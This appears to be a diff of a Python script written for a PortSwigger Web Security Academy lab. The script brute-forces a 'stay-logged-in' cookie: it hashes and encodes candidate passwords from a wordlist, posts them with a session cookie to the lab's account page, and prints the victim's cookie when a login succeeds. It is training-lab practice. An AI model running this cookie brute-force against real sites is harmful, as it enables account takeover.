@@ -4,10 +4,10 @@ import hashlib
 import base64
 from termcolor import colored
 
-url = "https://0a7600a7044f091fc0da0a7e004100fe.web-security-academy.net/my-account" # Set the url.
+url = "https://0a8f0022035363fcc0ca3664009a009a.web-security-academy.net/my-account" # Set the url.
 
 def cookie_brute_forcer(username):
-    with open("/PATH/passwords.txt","r") as file: # Modify it with the passwords list path.
+    with open("/home/sec0gh/Desktop/passwords.txt","r") as file: # Modify it with the passwords list path.
         for password in file:
             password = password.strip().encode()
 
@@ -20,15 +20,14 @@ def cookie_brute_forcer(username):
             stay_logged_in = cookie.decode('utf-8')
             
             cookies = {
-                "session": "PJJEEyZq4IL14JK6iTzqzyxR6uERhbwA",   # Change it with your cookie value.
+                "session": "6jQmXsS9QxiozOMl1dPpO4KVyIX8sUdP",   # Change it with your session value.
                 "stay-logged-in": stay_logged_in
                 }
             response = requests.post(url, cookies=cookies)
              
-            # You can check for the valid cookie of the username with any condition you can see appropriate.  
-            # "Update email" in response.text            
             if f"Your username is: {username}" in response.text:
                 print(colored(f"[+] Valid password is found... ","green"))
+                print(colored(f"The victim cookie is : {stay_logged_in}","green"))
                 return password.decode()  
             else:
                 print(colored(f"[!!] Incorrect password: {password.decode()}\n","red"))    
